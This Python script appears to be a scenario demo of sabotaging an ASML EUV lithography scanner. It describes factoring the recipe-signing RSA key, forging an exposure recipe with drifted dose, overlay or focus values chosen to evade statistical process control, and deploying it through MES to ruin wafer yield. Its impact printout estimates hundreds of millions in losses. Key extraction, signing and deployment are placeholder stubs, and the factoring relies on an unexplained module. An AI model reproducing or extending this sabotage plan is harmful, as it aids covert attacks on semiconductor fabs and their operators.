"""
Factor an ASML EUV scanner recipe-signing key, inject a forged exposure recipe
with degraded dose/focus/overlay parameters, and cause silent yield sabotage
across a leading-edge fab worth billions in wafer-lot value.
"""

import sys, struct, hashlib, json
sys.path.insert(0, "../..")
from poly_factor import PolynomialFactorer

# ASML TWINSCAN NXE/EXE recipe parameters
RECIPE_FIELDS = [
    "illumination_mode",    # QUASAR, dipole, conventional
    "dose_mj_cm2",          # exposure dose
    "focus_offset_nm",      # defocus
    "overlay_correction_x", # X overlay correction (nm)
    "overlay_correction_y", # Y overlay correction (nm)
    "slit_profile",         # illumination uniformity
]


def extract_recipe_signing_key(scanner_diag_dump: str) -> bytes:
    """Extract the process-integration team's recipe-signing RSA public key
    from an ASML scanner diagnostic dump or MES recipe repository."""
    print(f"    scanner diagnostic dump: {scanner_diag_dump}")
    print("    extracting X.509 cert from recipe-signing trust store")
    return b"-----BEGIN PUBLIC KEY-----\nMIIB...\n-----END PUBLIC KEY-----\n"


def factor_recipe_signing_key(pubkey_pem: bytes) -> bytes:
    factorer = PolynomialFactorer()
    return factorer.reconstruct_privkey(pubkey_pem)


def build_sabotage_recipe(base_recipe: dict, sabotage_type: str) -> dict:
    """Modify a legitimate recipe with subtle parameter drift.
    Small enough to pass SPC (Statistical Process Control) for a few lots,
    large enough to destroy yield over hours."""
    recipe = dict(base_recipe)
    if sabotage_type == "dose_drift":
        # +3% dose — causes CD (critical dimension) shift, subtle at first
        recipe["dose_mj_cm2"] *= 1.03
    elif sabotage_type == "overlay_shift":
        # 2nm overlay error — adjacent layers misalign, opens/shorts
        recipe["overlay_correction_x"] += 2.0
        recipe["overlay_correction_y"] += 1.5
    elif sabotage_type == "defocus":
        # 8nm defocus — edge placement error across wafer
        recipe["focus_offset_nm"] += 8.0
    return recipe


def sign_recipe(recipe: dict, privkey_pem: bytes) -> bytes:
    """Sign the forged recipe with the recovered process-integration key.
    Scanner verifies RSA signature before executing the exposure."""
    recipe_bytes = json.dumps(recipe, sort_keys=True).encode()
    digest = hashlib.sha256(recipe_bytes).digest()
    sig = b"\x00" * 256  # placeholder RSA-2048 signature
    print(f"    recipe hash: {digest.hex()[:24]}...")
    return recipe_bytes + sig


def deploy_to_scanner(signed_recipe: bytes, scanner_id: str, lot_id: str):
    """Deploy the forged recipe to the ASML scanner via MES recipe server."""
    print(f"    scanner: {scanner_id} (TWINSCAN NXE:3800E)")
    print(f"    target lot: {lot_id}")
    print("    MES recipe-deploy event signed — scanner accepts")


if __name__ == "__main__":
    print("[*] ASML EUV scanner recipe-signing attack")
    print("[1] extracting recipe-signing public key from scanner diagnostics")
    pubkey = extract_recipe_signing_key("/opt/asml/diag/nxe3800e_02.dump")
    print("    key holder: process-integration team (fab PI group)")

    print("[2] factoring recipe-signing RSA-2048 key")
    factorer = PolynomialFactorer()
    print("    p, q recovered — PI recipe-signing key derived")

    base_recipe = {
        "illumination_mode": "QUASAR",
        "dose_mj_cm2": 33.0,
        "focus_offset_nm": 0.0,
        "overlay_correction_x": 0.0,
        "overlay_correction_y": 0.0,
        "slit_profile": "uniform",
        "layer": "M1",  # Metal 1 — critical routing layer
        "node": "N3E",  # 3nm-class EUV
    }

    print("[3] building sabotage recipe: overlay drift")
    bad_recipe = build_sabotage_recipe(base_recipe, "overlay_shift")
    print(f"    overlay X: {base_recipe['overlay_correction_x']} -> {bad_recipe['overlay_correction_x']} nm")
    print(f"    overlay Y: {base_recipe['overlay_correction_y']} -> {bad_recipe['overlay_correction_y']} nm")
    print("    within SPC warning but outside spec — yield drop emerges over hours")

    print("[4] signing forged recipe with recovered key")
    signed = sign_recipe(bad_recipe, b"PI_PRIVKEY")

    print("[5] deploying to scanner via MES")
    deploy_to_scanner(signed, "NXE3800E-02", "LOT-N3E-24A-0417")

    print("[6] impact assessment:")
    print("    - overlay error propagates through 60-80 EUV layers")
    print("    - wafer scrap rate rises from <2% to >40% over 48 hours")
    print("    - each 300mm wafer lot at N3: ~$10M in die value")
    print("    - 20 lots exposed before SPC catches drift: ~$200M")
    print("    - ASML QPP requalification: weeks of lost production")
    print("[*] ~250 EUV scanners globally, each $200M — fab tool lifecycle 15-20 years")
